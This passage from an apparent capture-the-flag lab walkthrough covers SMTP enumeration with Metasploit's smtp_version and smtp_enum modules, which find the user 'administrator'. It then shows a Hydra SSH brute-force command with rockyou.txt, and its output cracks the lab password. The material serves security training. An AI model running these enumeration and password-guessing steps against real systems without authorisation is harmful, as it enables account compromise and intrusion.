</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploi
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>t.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>RPORT <span style="color:#fab387">25</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>THREADS <span style="color:#fab387">1</span> yes The number of concurrent threads <span style="color:#89dceb;font-weight:bold">(</span>max one per host<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>View the full module info with the info, or info -d command.</span></span></code></pre></div>
<br>
<p>Have a look through the options, does everything seem correct? What is the option we need to set?</p>






<pre tabindex="0"><code>RHOSTS</code></pre>
<br>
<p>Set that to the correct value for your target machine. Then run the exploit. What&rsquo;s the system mail name?</p>






<pre tabindex="0"><code>polosmtp.home</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> rhosts 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#f5e0dc">rhosts</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - 10.10.54.3:25 SMTP <span style="color:#fab387">220</span> polosmtp.home ESMTP Postfix <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span><span style="color:#89b4fa">\x</span>0d<span style="color:#89b4fa">\x</span>0a
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - Scanned <span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> hosts <span style="color:#89dceb;font-weight:bold">(</span>100% <span style="color:#89dceb">complete</span><span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed</span></span></code></pre></div>
<br>
<p>What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.</p>






<pre tabindex="0"><code>Postfix</code></pre>
<br>
<p>Good! We&rsquo;ve now got a good amount of information on the target system to move onto the next stage. Let&rsquo;s search for the module <code>smtp_enum</code>, what is the full module name?</p>






<pre tabindex="0"><code>auxiliary/scanner/smtp/smtp_enum</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt; search smtp_enum
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">0</span> auxiliary/scanner/smtp/smtp_enum normal No SMTP User Enumeration Utility
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Interact with a module by name or index. For example info 0, use <span style="color:#fab387">0</span> or use auxiliary/scanner/smtp/smtp_enum
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt;</span></span></code></pre></div>
<br>
<p>We&rsquo;re going to be using the <code>top-usernames-shortlist.txt</code> wordlist from the usernames subsection of seclists (/usr/share/wordlists/SecLists/usernames if you have it installed).
Seclists is an amazing collection of wordlists. If you&rsquo;re running Kali or Parrot you can install seclists with: <code>sudo apt install seclists</code>.</p>
<br>
<p>What option do we need to set to the wordlist&rsquo;s path?</p>






<pre tabindex="0"><code>USER_FILE</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metaspl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>oit/basics/using-metasploit.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>RPORT <span style="color:#fab387">25</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>THREADS <span style="color:#fab387">1</span> yes The number of concurrent threads <span style="color:#89dceb;font-weight:bold">(</span>max one per host<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>UNIXONLY <span style="color:#89dceb">true</span> yes Skip Microsoft bannered servers when testing unix users
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>USER_FILE /opt/metasploit-framework/embedded/fram yes The file that contains a list of probable users accounts.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>ework/data/wordlists/unix_users.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>View the full module info with the info, or info -d command.</span></span></code></pre></div>
<br>
<p>Once we&rsquo;ve set this option, what is the other essential parameter we need to set?</p>






<pre tabindex="0"><code>RHOSTS</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span><span style="color:#f5e0dc">USER_FILE</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> RHOSTS 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#f5e0dc">RHOSTS</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - 10.10.54.3:25 Banner: <span style="color:#fab387">220</span> polosmtp.home ESMTP Postfix <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - 10.10.54.3:25 Users found: administrator
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - Scanned <span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> hosts <span style="color:#89dceb;font-weight:bold">(</span>100% <span style="color:#89dceb">complete</span><span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed</span></span></code></pre></div>
<br>
<p>What username is returned?</p>






<pre tabindex="0"><code>administrator</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - 10.10.54.3:25 Users found: administrator</span></span></code></pre></div>
<br>
<h4 id="exploiting-smtp">Exploiting SMTP</h4>
<p>At the end of our Enumeration section we have a few vital pieces of information:</p>
<ol>
<li>A user account name</li>
<li>The type of SMTP server and Operating System running.</li>
</ol>
<p>We know from our port scan, that the only other open port on this machine is an SSH login. We&rsquo;re going to use this information to try and bruteforce the password of the SSH login for our user using Hydra.</p>
<p>There is a wide array of customizability when it comes to using Hydra. Hydra uses dictionary attacks primarily, both Kali Linux and Parrot OS have many different wordlists in the <code>/usr/share/wordlists directory</code> – If you would like to browse and find a different wordlists to the widely used &ldquo;rockyou.txt&rdquo;.</p>
<p>The syntax for the command we&rsquo;re going to use to find the password is this:</p>
<p><code>hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.54.3 ssh</code></p>
<ul>
<li><code>hydra</code>: runs the hydra tool</li>
<li><code>-t 16</code>: number of parallel connections per target</li>
<li><code>-l [user]</code>: points to the user whose account you&rsquo;re trying to compromise</li>
<li><code>-P [path to dictionary]</code>: points to the file containing the list of possible passwords</li>
<li><code>-vV</code>: sets verbose mode to very verbose, shows the login+pass combination for each attempt</li>
<li><code>[machine ip]</code>: the IP address of the target machine</li>
<li><code>ssh / protocol</code>: sets the protocol</li>
</ul>
<br>
<p>What is the password of the user we found during our enumeration stage?</p>






<pre tabindex="0"><code>alejandro</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# hydra -t <span style="color:#fab387">16</span> -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.54.3 ssh
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Hydra v8.6 <span style="color:#89dceb;font-weight:bold">(</span>c<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#fab387">2017</span> by van Hauser/THC - Please <span style="color:#cba6f7">do</span> not use in military or secret service organizations, or <span style="color:#cba6f7">for</span> illegal purposes.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Hydra <span style="color:#89dceb;font-weight:bold">(</span>http://www.thc.org/thc-hydra<span style="color:#89dceb;font-weight:bold">)</span> starting at 2024-06-26 04:28:32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">[</span>WARNING<span style="color:#89dceb;font-weight:bold">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#fab387">4</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>DATA<span style="color:#89dceb;font-weight:bold">]</span> max <span style="color:#fab387">16</span> tasks per <span style="color:#fab387">1</span> server, overall <span style="color:#fab387">16</span> tasks, <span style="color:#fab387">14344398</span> login tries <span style="color:#89dceb;font-weight:bold">(</span>l:1/p:14344398<span style="color:#89dceb;font-weight:bold">)</span>, ~896525 tries per task
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>DATA<span style="color:#89dceb;font-weight:bold">]</span> attacking ssh://10.10.54.3:22/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>VERBOSE<span style="color:#89dceb;font-weight:bold">]</span> Resolving addresses ... <span style="color:#89dceb;font-weight:bold">[</span>VERBOSE<span style="color:#89dceb;font-weight:bold">]</span> resolving <span style="color:#cba6f7">done</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>INFO<span style="color:#89dceb;font-weight:bold">]</span> Testing <span style="color:#cba6f7">if</span> password authentication is supported by ssh://administrator@10.10.54.3:22
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>INFO<span style="color:#89dceb;font-weight:bold">]</span> Successful, password authentication is supported by ssh://10.10.54.3:22
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;123456&#34;</span> - <span style="color:#fab387">1</span> of <span style="color:#fab387">14344398</span> <span style="color:#89dceb;font-weight:bold">[</span>child 0<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;12345&#34;</span> - <span style="color:#fab387">2</span> of <span style="color:#fab387">14344398</span> <span style="color:#89dceb;font-weight:bold">[</span>child 1<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/0<span style="color:#89dceb;font-weight:bold">)</span></span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;killer&#34;</span> - <span style="color:#fab387">143</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 11<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;sandra&#34;</span> - <span style="color:#fab387">144</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 14<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;alejandro&#34;</span> - <span style="color:#fab387">145</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 15<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;buster&#34;</span> - <span style="color:#fab387">146</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 10<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;george&#34;</span> - <span style="color:#fab387">147</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 4<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">[</span>22<span style="color:#89dceb;font-weight:bold">][</span>ssh<span style="color:#89dceb;font-weight:bold">]</span> host: 10.10.54.3 login: administrator password: alejandro
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#89dceb;font-weight:bold">[</span>STATUS<span style="color:#89dceb;font-weight:bold">]</span> attack finished <span style="color:#cba6f7">for</span> 10.10.54.3 <span style="color:#89dceb;font-weight:bold">(</span>waiting <span style="color:#cba6f7">for</span> children to <span style="color:#89dceb">complete</span> tests<span style="color:#89dceb;font-weight:bold">)</span>
